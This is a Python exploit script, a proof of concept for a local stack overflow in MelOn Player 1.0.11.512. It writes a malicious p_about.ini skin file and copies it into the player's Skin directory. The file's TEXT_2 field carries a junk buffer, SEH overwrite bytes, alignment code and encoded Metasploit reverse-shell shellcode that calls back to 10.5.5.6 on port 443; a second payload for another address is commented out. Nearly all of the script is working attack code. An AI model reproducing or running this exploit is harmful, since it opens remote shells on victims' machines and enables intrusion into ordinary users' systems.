#!/usr/bin/python

import os,sys,shutil,time

header=("""[MAIN]
MainStyle=SKIN
Resize=NO
Mask=YES
BGStyle=IMAGE
DefSize=0,0,427,136
Image=skin.bmp
Button=2
Slider=
Static=1
Text=4
Edit=
Combo=


[MAINBG]
TopLeft=145,389,6,21
TopCenter=153,389,11,21
TopRight=166,389,6,21
MiddleLeft=145,412,6,21
MiddleCenter=153,412,11,21
MiddleRight=166,412,6,21
BottomLeft=145,435,6,34
BottomCenter=153,435,11,34
BottomRight=166,435,6,34

[MAINMASK]
TopLeft=174,389,10,10
TopCenter=185,389,10,10
TopRight=196,389,10,10
MiddleLeft=185,389,10,10
MiddleCenter=185,389,10,10
MiddleRight=185,389,10,10
BottomLeft=174,400,10,10
BottomCenter=185,389,10,10
BottomRight=196,400,10,10


[BUTTON_1]
Name=??
ID=1001
ResizeStyle=TOP_LEFT
Tooltip=
CheckBox=FALSE
Position=410,4,13,13
NormalRect=223,389,13,13
OverRect=238,389,13,13
DownRect=253,389,13,13
DisabledRect=223,389,13,13
MaskRect=2000,0,13,13

[BUTTON_2]
Name=??
ID=1002
ResizeStyle=TOP_LEFT
Tooltip=
CheckBox=FALSE
Position=173,105,80,20
NormalRect=0,763,80,20
OverRect=0,763,80,20
DownRect=81,763,80,20
DisabledRect=162,763,80,20
MaskRect=2000,0,80,20


[STATIC_1]
Name=???_??
ID=2001
Position=20,31,72,84
TopLeft=14,478,72,84
TopCenter=
TopRight=
MiddleLeft=
MiddleCenter=
MiddleRight=
BottomLeft=
BottomCenter=
BottomRight=


[TEXT_1]
Name=popup Name sdw
ID=3701
Position=2,2,420,14
Text=MelOn Player
Font=Arial
FontSize=12
FontBold=
Align=CENTER
FontColor=0,0,0
""")

footer=("""
[TEXT_3]
Name=????
ID=3703
Position=104,50,243,14
Text=Melon Player Version 1.0.0.101102
Font=Arial
FontSize=12
FontBold=
Align=
FontColor=0,0,0

[TEXT_4]
Name=Copyright
ID=3704
Position=104,72,303,14
Text=Copyright PT. Melon Indonesia. All Right Reserved.
Font=Arial
FontSize=12
FontBold=
Align=
FontColor=0,0,0
""")

filename="p_about.ini"
splash=os.path.abspath(filename)
skindir="C:\Program Files\MelonPlayerID\Skin"

junk = "A" * 2052
nseh = "\x61\x62"
seh = "\x73\x74"

align = "\x60"                      #pushad
align += "\x73"                     #nop/align
align += "\x53"                     #push ebx
align += "\x73"                     #nop/align
align += "\x58"                     #pop eax
align += "\x73"                     #nop/align
align += "\x05\x02\x11"             #add eax,0x11000200
align += "\x73"                     #nop/align
align += "\x2d\x01\x11"             #sub eax,0x11000120
align += "\x73"                     #nop/align

walk = "\x50"                       #push eax
walk += "\x73"                      #nop/align
walk += "\xc3"                      #ret

sampah = "\x44" * 106 + "\x73"

# msfpayload windows/shell_reverse_tcp, lhost=192.168.96.129, lport=443
#shellcode= ("PPYAIAIAIAIAQATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBKLIX4IKPM0M0QPSYYUNQXRS4TKPRNPTKQBLLDKB2N44KBRNHLOX7PJNF01KOP1I0VLOLC13LLBNLMPWQ8OLMKQXGZBJPR2PW4K0RLPDKQ2OLKQ8PTKOPSH3U903DOZM1XPPPDKPHN8TKPXMPKQICK3OLPIDKP4TKM1J6NQKONQI06LI18OLMKQY7NX9P2UL4KS3MJXOK3MMTT5YRR8DK0XNDKQ9C2F4KLLPKDKR8MLM1XSTKKTTKKQ8PU9OTO4O4QKQK1QB90ZR1KOIPPXQOPZTKLRZKU6QM38NS02KPKPQX472SNRQOQD2HPLRWMVLGKOZ5H860KQM0KPO9Y4QDPPQXMYE0RKKPKOHU0PPP0PPPOPPPOPPP38YZLOYOK0KOZ54I7W387PEXQPM1QXKRKPKQGKSYK6QZN00V1GQXV975SDC1KOXUS833BMRDKPE9JC1GR7PWNQKFRJN2B9QFK2KMS6Y7PDNDOLKQKQTMPDO4LPWVKPPD1D20PVQF0VOVPVPNQF1FR3B61X49HLOOE6KOXUU9K0PNR6OVKONPQXKXSWMM30KOXUWKL07EW2B6RHEV65WMEMKOZ5OLKVSLKZSPKKK0BUKUGKOWMC422O1ZKPR3KOZ5A")

# msfpayload windows/shell_reverse_tcp, lhost=10.5.5.6, lport=443
shellcode= ("PPYAIAIAIAIAQATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBKLK8SYKPKPKPQP59K5NQXRRD4KR2NPTKPRLL4KR2LTTKCBO8LOX7OZO6NQKONQWPVLOLQQSLKRNLMP7QHOLMKQ97K2ZP0R27TKPRLP4KQ2OLKQHPTKOPT83UY0SDOZKQ8PPPTKOXN8TK0XMPM18SISOLQ9TKNTTKM1YFNQKONQWPVL7QHOLMKQWWNXK0CEL4M3CMZXOKSMMT2UZBQH4KPXO4KQZ3364KLL0KTK0XMLM1XS4KM44KKQXPCYOTO4O41KQKS1B9QJPQKOK028QOPZDKMBZKSVQMQXP3OBKPKP1XT7SCP2QOPTQXPL3GO6LGKOZ56XTPM1KPM0MYWT1DPPQXMYCPBKKPKOXU0PPPPPPPOPPPOPPP38JJLOIOIPKO8UCY97C8LJKULEKVQXM2KPKQWKTIYV2JLPQFPWQXUI75RT31KOZ52HQS2M34M03YISPWPWR7NQJVRJLRPYPV9RKM2FI7OTMTOLKQM1DMPDO4N0WVKPQ40T0P0VPVB6Q6PVPNR6QFPS0VQXBYXLOOSVKOJ54IK0PNQFPFKONP2HM8TGMMS0KOJ5WKJP6UW2PVBHUVEE7MUMKOXUOLKV3LKZ3PKK9P3EKUGK17LS422O2JM0B3KOJ5A")

buggy=("""
[TEXT_2]
Name=popup Name
ID=3702
Position=3,3,420,14
Text="""+junk + nseh + seh + align + walk + sampah + shellcode + "D" * (5000 - len(junk+nseh+seh+align+walk+sampah+shellcode)) + """
Font=Arial
FontSize=12
FontBold=
Align=CENTER
FontColor=170,170,170\r\n""")

banner=("""
[*] MelOnPlayer 1.0.11.512 Local Stack Overflow POC
[*] modpr0be[at]spentera[dot]com.
[*] thanks a lot: cyb3r.anbu and otoy :)
=====================================================
""")

file=open(filename,'w')
if os.name == 'nt':
	if os.path.isdir(skindir):
		try:
			file.write(header+buggy+footer)
			print banner
			print "[*] Creating the malicious .ini file.."
			time.sleep(2)
			print "[*] Malicious file (POC)",filename,"created.."
			print "[*] Path:",splash
			file.close()
			shutil.copy2(splash,skindir)
			print "[*] File",filename,"has been copied to",skindir
		except IOError:
			print "[-] Could not write to destination folder, check permission.."
			sys.exit()
	else:
		print "[-] Could not find Skin directory, is Melon Player installed?"
		sys.exit()
else:
	print "[-] Please run this script on Windows."
	sys.exit()
